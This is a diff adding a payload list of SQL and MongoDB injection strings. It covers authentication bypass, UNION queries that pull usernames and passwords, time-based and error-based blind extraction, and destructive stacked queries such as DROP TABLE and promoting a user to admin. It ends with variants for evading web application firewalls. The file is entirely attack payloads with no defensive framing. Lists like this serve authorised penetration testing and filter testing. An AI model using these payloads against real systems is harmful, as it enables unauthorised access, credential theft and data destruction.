@@ -1,0 +1,77 @@
+# SQL Injection - Authentication Bypass Payloads
+# Source: exploit-cookbook + security-arsenal-argus + sqli-payloads.md
+
+# Basic auth bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+admin'--
+admin'/*
+' OR 1=1#
+" OR 1=1#
+" OR 1=1--
+' OR ''='
+') OR ('1'='1
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'/*
+
+# Union-based extraction
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Time-based blind
+' OR SLEEP(5)--
+' OR BENCHMARK(10000000,SHA1('test'))--
+'; WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND (SELECT CASE WHEN SUBSTRING((SELECT database()),1,1)='a' THEN SLEEP(5) ELSE 0 END)--
+
+# Error-based extraction
+' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+
+# Stacked queries
+'; SELECT * FROM users--
+'; INSERT INTO users VALUES('hacker','password123')--
+'; DROP TABLE users--
+'; UPDATE users SET role='admin' WHERE username='attacker'--
+
+# Second-order SQLi
+# Input stored, then triggered:
+# username: admin'--
+# password: anything
+# Later: login with admin'-- as username
+
+# NoSQL injection (MongoDB)
+' || '1'=='1
+' || 1==1//
+{"$gt":""}
+{"$ne":""}
+[$ne]=1
+[$regex]=.*
+[$where":"1==1"]
+username[$ne]=&password[$ne]=
+username=admin&password[$gt]=
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+
+# WAF bypass variants
+/*!50000 OR*/ 1=1--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' UnIoN SeLeCt 1,2,3--
+' UN/**/ION SE/**/LECT 1,2,3--
+%27%20OR%201%3D1--
+' OR 0x31=0x31--
+' OR 'ab'='a'+'b'--
+' OR 'a' LIKE 'a'--
